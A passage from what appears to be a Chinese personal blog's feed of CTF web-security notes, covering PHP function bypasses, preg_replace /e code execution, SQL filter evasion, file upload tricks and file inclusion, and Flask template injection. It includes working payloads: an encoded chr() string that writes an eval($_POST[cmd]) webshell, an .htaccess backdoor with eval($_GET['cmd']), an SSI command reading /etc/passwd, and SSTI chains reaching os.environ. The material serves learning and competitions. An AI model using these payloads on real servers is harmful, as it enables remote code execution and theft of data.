</p></blockquote><h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h2><blockquote><p>二次编码绕过</p></blockquote><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><blockquote><p>ereg()函数匹配数组的时候会返回null </p><p>用%00来绕过ereg()变量 </p></blockquote><h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><blockquote><p>strpos()函数和ereg()函数一样也具有数组绕过漏洞 </p></blockquote><h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><blockquote><p>is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较 </p></blockquote><h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote><p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p></blockquote><h2 id="curl-inti"><a href="#curl-inti" class="headerlink" title="curl_inti()"></a>curl_inti()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用 </span><br><span class="line">curl_setopt — 为给定的cURL会话句柄设置一个选项。</span><br><span class="line">        说明：</span><br><span class="line">          bool curl_setopt ( resource $ch , int $option , mixed $value )</span><br><span class="line">        参数:</span><br><span class="line">          ch：由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">          option：需要设置的CURLOPT_XXX选项。</span><br><span class="line">          value：将设置在option选项上的值。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span><br><span class="line">            CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span><br><span class="line">            CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            ###################</span><br><span class="line">            文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流</span><br><span class="line">curl_exec ：执行 cURL 会话</span><br><span class="line">curl_getinfo — 获取一个cURL连接资源句柄的信息</span><br><span class="line">                说明：</span><br><span class="line">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span><br><span class="line">                参数：</span><br><span class="line">                      ch 由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">                      opt：这个参数可能是以下常量之一:</span><br><span class="line">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span><br><span class="line">cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</span><br><span class="line">PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</span><br><span class="line">libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</span><br><span class="line">PHP中使用cURL实现Get和Post请求的方法</span><br><span class="line">这些函数在PHP 4.0.2中被引入。</span><br></pre></td></tr></table></figure><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p><p><strong>preg_replace函数原型：</strong></p><p>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [int limit])</p><p><strong>特别说明：</strong> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace (&quot;/(&lt;/?)(w+)([^&gt;]*&gt;)/e&quot;,</span><br><span class="line">&quot;\1.strtoupper(\2).\3&quot;,</span><br><span class="line">$html_body);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这将使输入字符串中的所有 HTML 标记变成大写。</p><p>安全威胁分析： 通常subject参数是由客户端产生的，客户端可能会构造恶意的代码，例如：</p><p>复制代码 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 如果我们提交下面的代码会怎么样呢？ ?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 密文对应的明文是：fputs(fopen(data/a.php,w),<?php eval($_POST[cmd])?>); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。</p><p>再来一个有难度的例子：</p><p>复制代码 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>提交 ?h=[php]phpinfo()[/php]，phpinfo()会被执行吗？ 肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。 有没有办法让它执行呢？</p><p>当然有。在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。为什么呢？ 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。</p><p>在这里我们需要通过{${}}构造出了一个特殊的变量，’test(“{${phpinfo()}}”)’，达到让函数被执行的效果（${phpinfo()}会被解释执行）。 可以先做如下测试：</p><p>复制代码 代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure><p>phpinfo会被成功执行了。</p><p>如何防范这种漏洞呢？ 将’test(“\1”)’ 修改为”test(‘\1’)”，这样‘${phpinfo()}’就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。</p><blockquote><p>函数的第一个和第三个参数都是我们可以控制 </p><p>function complex($re, $str) {<br>   return preg_replace(‘/(‘ . $re . ‘)/ei’,’strtolower(“\1”)’,$str);<br>}</p><p>foreach($_GET as $re =&gt; $str) {<br>   echo complex($re, $str). “\n”;<br>}</p></blockquote><p> 官方 <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>/?.*</strong> ，值为 <strong>{${phpinfo()}}</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value);</span><br><span class="line">变成了语句： preg_replace(&apos;/(.*)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p> 用来执行函数 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function fun($a)&#123;</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(fun, 12);</span><br><span class="line"></span><br><span class="line">?&gt;      \\outcome：12</span><br></pre></td></tr></table></figure><p> 但如果传入的参数，是一个数组，且数组的第一个值是一个类的名字，或一个对象，那么，就会把数组的第二个值，当做方法，然后执行。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class fun&#123;</span><br><span class="line">    function __call($a,$b)&#123;  \\当调用的方法不存在时，执行</span><br><span class="line">        echo 11;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new fun();</span><br><span class="line">call_user_func(array($a,&quot;aaaas&quot;));</span><br><span class="line"></span><br><span class="line">?&gt;   \\outcome：11</span><br></pre></td></tr></table></figure><h2 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h2><p>basename在处理多比特编码的字符串时会出现一些问题（比如中文，百度这个函数的时候全是说获取中文的问题），那么使用一个超出ascii码范围的字符就可以绕过 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>过滤绕过</title>
      <link href="/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>注释绕过空格</p><blockquote><p>在MySQL中，用/**/来标记注释的内容。比如SQL查询：<br>select user() from dual<br>我们用注释替换空格，就可以变成：<br>select/**/user()/**/from/**/dual</p></blockquote><a id="more"></a><p>括号绕过空格 </p><blockquote><p>空格被过滤，但括号没有被过滤，可通过括号绕过。<br>我的经验是，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>括号绕过空格的方法，在time based盲注中，是屡试不爽的。<br>举例说明，我们有这样的一条SQL查询：<br>select user() from dual where 1=1 and 2=2<br>观察到user()可以算值，那么user()两边要加括号，变成：<br>select(user())from dual where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：<br>select(user())from dual where(1=1)and(2=2)</p><p><a href="http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109" target="_blank" rel="noopener">http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109</a>))<br>这条语句是猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟。它：</p><p>1) 既没有用到逗号、大小于符号<br>2) 也没有使用空格</p></blockquote><p>可尝试Tab替代空格</p><h4 id="绕过特殊字符过滤"><a href="#绕过特殊字符过滤" class="headerlink" title="绕过特殊字符过滤"></a>绕过特殊字符过滤</h4><blockquote><p>可以用chr()函数绕过</p></blockquote><h4 id="被过滤"><a href="#被过滤" class="headerlink" title="-- 被过滤"></a>-- 被过滤</h4><blockquote><p>用# </p></blockquote><h4 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h4><p>用%00</p><blockquote><p>例如:uni%00on </p></blockquote><h4 id="file-被过滤"><a href="#file-被过滤" class="headerlink" title="file://被过滤"></a>file://被过滤</h4><blockquote><p><code>file：/</code>、<code>file:&lt;空格&gt;///</code> </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果</p><p>在.user.ini中可以识别PHP_INI_PERDIR和PHP_INI_USER模式的INI设置<br>关于PHP_INI_*一共有四种：</p><a id="more"></a><blockquote><p>PHP_INI_USER 可在用户脚本以及.user.ini中设定</p></blockquote><blockquote><p>PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定</p></blockquote><blockquote><p>PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定</p></blockquote><blockquote><p>PHP_INI_ALL 可在任何地方设定</p></blockquote><p>auto_prepend_file</p><p>该配置项会让php文件在执行前先包含一个指定的文件，通过这个配置项，我们就可以来隐藏自己的后门</p><p>.user.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure><p>.user.ini利用条件</p><blockquote><p>服务器脚本语言为PHP</p><p>服务器使用CGI／FastCGI模式<br>上传目录下要有可执行的php文件<br>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache</p><p>但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p><p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，当对上传时的路径没有检测../时，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini</p></blockquote><p><a href="https://www.cnblogs.com/anbuxuan/p/11867129.html" target="_blank" rel="noopener">Apache中.htaccess文件利用的总结与新思路拓展</a></p><h2 id="htaccess文件利用"><a href="#htaccess文件利用" class="headerlink" title=".htaccess文件利用"></a>.htaccess文件利用</h2><h3 id="将特定文件作为php解析，用作后门。"><a href="#将特定文件作为php解析，用作后门。" class="headerlink" title="将特定文件作为php解析，用作后门。"></a>将特定文件作为php解析，用作后门。</h3><p>Module模式下写法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;test.jpg&quot;&gt;    SetHandler application/x-httpd-php  &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>甚至可以将 .htaccess本身作为php来解析，里面编写一句话。这块网络上相关资料很多。</p><h3 id="PHP环境下使用-auto-prepend-file-或-auto-append-file-创建后门"><a href="#PHP环境下使用-auto-prepend-file-或-auto-append-file-创建后门" class="headerlink" title="PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门"></a>PHP环境下使用 auto_prepend_file 或 auto_append_file 创建后门</h3><p>通过配置auto_append_file或auto_prepend_file可以向所有php文件中的开头或尾部插入指定的文件的内容。</p><p>在. htaccess中的写入如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;</span><br><span class="line">php_value auto_append_file &quot;/home/fdipzone/footer.php&quot;</span><br></pre></td></tr></table></figure><p>可以包含自己</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file  &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure><p> 将php代码写入.htaccess。代码前注释。访问index.php。就会自动包含.htaccess中的恶意代码 </p><p>如果过滤可以用\绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&apos;cmd&apos;]); ?&gt;\</span><br></pre></td></tr></table></figure><p> .htaccess中的#号将我们的恶意代码和污染的字符串都注释了。从而可以正常运行 </p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\</span><br></pre></td></tr></table></figure><h3 id="开启了cgi扩展，可以来解析shell脚本"><a href="#开启了cgi扩展，可以来解析shell脚本" class="headerlink" title="开启了cgi扩展，可以来解析shell脚本"></a>开启了cgi扩展，可以来解析shell脚本</h3><p>.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure><p>solve.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Content-Type: text/plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">ls -lah /</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>不能写 &lt;? 时使用伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .wuwu</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;</span><br></pre></td></tr></table></figure><p>支持换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType  application/x-httpd-p\</span><br><span class="line">hp    .jpg</span><br></pre></td></tr></table></figure><h2 id="使用00截断（需要magic-quotes-gpc-Off）"><a href="#使用00截断（需要magic-quotes-gpc-Off）" class="headerlink" title="使用00截断（需要magic_quotes_gpc=Off）"></a>使用00截断（需要magic_quotes_gpc=Off）</h2><p>基于一个组合逻辑漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = getname(http request)//假如这时候获取到的文件名是test.asp.jpg(asp后面为0x00)</span><br><span class="line">type = gettype(name)//而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg</span><br><span class="line">if(type==jpg)</span><br><span class="line">SaveFileToPath(UploadPath.name,name)</span><br></pre></td></tr></table></figure><p>在第一个后缀名后加一个空格(0x20)，使用bp-&gt;repeater-&gt;hex，将其改成0x00</p><h2 id="shtml"><a href="#shtml" class="headerlink" title="shtml"></a>shtml</h2><p>当Web服务器为Apache和IIS（支持SSI功能的服务器）且开启了SSI与CGI支持</p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<!--#exec cmd=”id” -->语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure><h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul><li>情景<br>文件上传后，检测是否合法，不合法就删除</li><li>利用方式<br>在删除前访问到上传的文件</li></ul><p><a href="https://github.com/backlion/demo/blob/master/lfi_phpinfo.py" target="_blank" rel="noopener">例子</a> </p><h2 id="过滤-lt-或php"><a href="#过滤-lt-或php" class="headerlink" title="过滤&lt;?或php"></a>过滤&lt;?或php</h2><ul><li>js标签绕过，需要php小于7.0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;PHP&quot;&gt;</span><br><span class="line">$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&apos;r&apos;);</span><br><span class="line">echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));</span><br><span class="line">fclose($fh);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用``输出变量，在PHP 5.4 之后默认支持</li></ul><blockquote><p>gif<code>的文件头</code>GIF89a </p><p>nginx的服务器，而且上传目录下有一个php文件，所以上窜.user.ini<br>apache的服务器，应该上传.htaccess</p><p>两个要注意的点是:<br>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时个办法:</p><p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。</p><p>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。</p><p>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p><p>#define test_width 16<br>#define test_height 7</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h2><h2 id="php中常见的文件包含函数有以下四种："><a href="#php中常见的文件包含函数有以下四种：" class="headerlink" title="php中常见的文件包含函数有以下四种："></a>php中常见的文件包含函数有以下四种：</h2><blockquote><p>include()<br>require()<br>include_once()<br>require()_once()</p></blockquote><p>include与require基本是相同的，除了错误处理方面:</p><a id="more"></a><p>include()，只生成警告（E_WARNING），并且脚本会继续<br>require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本<br>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p><blockquote><p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p></blockquote><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p> <code>file_get_contents</code> 是可以触发 <code>php://filter</code> </p><p>php://filter在双off的情况下也可以正常使用；</p><p>allow_url_fopen ：off/on</p><p>allow_url_include：off/on</p><blockquote><p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 </p><p>?path=php://filter/read=convert.base64-encode/resource=xxxxx.php</p></blockquote><h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><blockquote><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的</p></blockquote><p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain; base64,</span><br></pre></td></tr></table></figure><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p> 包含的实现<br>包含的时候，不一定要包含.php文件，只要包含一块完整的php代码，例如a.jpg，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模块注入</title>
      <link href="/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="基本判断"><a href="#基本判断" class="headerlink" title="基本判断"></a>基本判断</h3><p><img src="/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/%E5%88%A4%E6%96%AD.png" alt></p><h3 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__dict__ 保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p><code></code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code></code>或者<code></code>得到flag </p><h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</span><br></pre></td></tr></table></figure><h4 id="“”-等"><a href="#“”-等" class="headerlink" title="“”,[],()等"></a>“”,[],()等</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主要目的是配合__class__.__mro__[2]这样找到object类</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].__dict__.environ[&apos;FLAG&apos;]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等"><a href="#url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等" class="headerlink" 